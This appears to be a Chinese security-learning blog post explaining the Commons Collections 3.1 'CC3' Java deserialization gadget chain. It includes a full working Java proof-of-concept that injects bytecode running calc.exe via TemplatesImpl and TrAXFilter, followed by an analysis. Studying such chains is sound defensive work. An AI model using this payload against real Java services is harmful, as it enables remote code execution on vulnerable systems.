# CommonsCollections3 （CC3链）

## 说明

### 导入依赖

    
    
    <dependency>  
      <groupId>commons-collections</groupId>  
      <artifactId>commons-collections</artifactId>  
      <version>3.1</version>  
    </dependency>

### 利用链

    
    
    AnnotationInvocationHandler.readObject()  
     $Proxy.entrySet()  
        AnnotationInvocationHandler.invoke()  
           LazyMap.get()  
              ChainedTransformer.transform()  
                 ConstantTransformer.transform()  
                 InstantiateTransformer.transform()  
                    TrAXFilter.TrAXFilter()  
                       TemplatesImpl.newTransformer()  
                          TemplatesImpl.getTransletInstance()

### 简化后的payload

    
    
    package com.ysoserial;  
    ​  
    import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  
    import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;  
    import javassist.CannotCompileException;  
    import javassist.ClassPool;  
    import javassist.CtClass;  
    import javassist.NotFoundException;  
    import org.apache.commons.collections.Transformer;  
    import org.apache.commons.collections.functors.ChainedTransformer;  
    import org.apache.commons.collections.functors.ConstantTransformer;  
    import org.apache.commons.collections.functors.InstantiateTransformer;  
    import org.apache.commons.collections.map.LazyMap;  
    import javax.xml.transform.Templates;  
    import java.io.*;  
    import java.lang.reflect.*;  
    import java.util.HashMap;  
    import java.util.Map;  
    ​  
    ​  
    ​  
    public class CommonCollections3 {  
      public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException, NoSuchFieldException, NotFoundException, CannotCompileException, NotFoundException, CannotCompileException {  
    ​  
    ​  
          ClassPool pool = ClassPool.getDefault();  
          CtClass doCalc = pool.makeClass("doCalc");  
          CtClass dad = pool.getCtClass("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");  
          doCalc.makeClassInitializer().setBody("java.lang.Runtime.getRuntime().exec(\"calc.exe\");");  
          doCalc.setSuperclass(dad);  
          byte[] bytes1 = doCalc.toBytecode();  
    ​  
          TemplatesImpl templates = new TemplatesImpl();  
          setFieldValue(templates,"_name","ZeanHike");  
          setFieldValue(templates,"_bytecodes",new byte[][]{bytes1});  
    ​  
    ​  
          Transformer transformerChain = new ChainedTransformer(new Transformer[]{  
                  new ConstantTransformer(TrAXFilter.class),  
                  new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates})  
    ​  
          });  
          //AnnotationInvocationHandler无法直接new  
          String ANNOTATION_CLASS="sun.reflect.annotation.AnnotationInvocationHandler";  
          Constructor<?> firstConstructor = Class.forName(ANNOTATION_CLASS).getDeclaredConstructors()[0];  
          firstConstructor.setAccessible(true);  
          Map lazyMap = LazyMap.decorate(new HashMap(), transformerChain);  
    ​  
    ​  
    ​  
          Map mapProxy = (Map) Proxy.newProxyInstance(  
                  CommonCollections1.class.getClassLoader(),  
                  new Class[]{Map.class},  
                  (InvocationHandler) firstConstructor.newInstance(Override.class, lazyMap)  
          );  
    ​  
    ​  
          InvocationHandler invocationHandler = (InvocationHandler) firstConstructor.newInstance(Override.class, mapProxy);  
    ​  
    ​  
          //序列化  
          ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();  
          ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);  
          objectOutputStream.writeObject(invocationHandler);  
          byteArrayOutputStream.flush();  
          byte[] bytes = byteArrayOutputStream.toByteArray();  
    ​  
    ​  
          //反序列化  
          ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);  
          ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);  
          objectInputStream.readObject();  
    ​  
    ​  
      }  
    ​  
      public static void setFieldValue(Object obj,String field,Object value) throws NoSuchFieldException, IllegalAccessException {  
          Field field1 = obj.getClass().getDeclaredField(field);  
          field1.setAccessible(true);  
          field1.set(obj,value);  
      }  
    }

## 分析正文

有过1和2的基础之后看3就应该很容易了，这里用了InstantiateTransformer，而CC1用了InvokerTransformer

我们从不同之处开始说起

![image-20220419191346857](https://image.3001.net/images/20220420/1650434795_625fa2eb236f5873f9dcb.png!small)

第一次循环返回了TrAXFilter.class作为object的值，在第二次循环将这个object值作为transform的参数传递，

因为iTransformers[1]为InstantiateTransformer类型，所以他会去执行InstantiateTransformer的transform方法

![image-20220419191700012](https://image.3001.net/images/20220420/1650434863_625fa32f3ff3b1810bd50.png!small)

而这个input为TrAXFilter，然后他会去执行TrAXFilter的构造函数，

![image-20220419192002902](https://image.3001.net/images/20220420/1650434865_625fa331b398984768c56.png!small)

然后又去执行TemplatesImpl.newTransformer()，CC1链和CB1链都用了TemplatesImpl的newTransformer()方法的后续利用链，这条利用链是前面章节所讲的内容了，这里不再讲

这里的payload有点像CC1和CC2的组合

构造payload，成功召唤出神兽

![image-20220419192725210](https://image.3001.net/images/20220420/1650434926_625fa36e700beeacf7b4a.png!small)

